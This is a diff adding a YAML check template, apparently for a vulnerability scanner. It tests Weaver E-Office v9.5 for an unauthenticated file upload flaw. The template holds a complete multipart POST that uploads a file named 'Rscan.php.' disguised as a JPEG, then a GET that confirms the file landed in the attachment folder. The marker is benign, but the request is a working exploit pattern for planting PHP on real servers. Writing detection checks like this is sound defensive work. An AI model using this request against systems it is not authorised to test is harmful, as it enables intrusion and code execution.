@@ -1,0 +1,21 @@
+name: 泛微-EOffice-v9.5-sample权限绕过+file-upload.php文件上传
+description: >
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:   
+  - method: POST
+    path: /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save
+    search: 'attachment\\/(?P<id>\d+)\\'
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"    
+    body: "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\nContent-Disposition: form-data; name=\"upload_quwan\"; filename=\"Rscan.php.\"\r\nContent-Type: image/jpeg\r\n\r\nRscan_test\r\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--"
+    expression:
+      status: 200
+      body_all:
+        - "attachment"
+  - method: GET
+    path: /attachment/{{id}}/Rscan.php
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]    
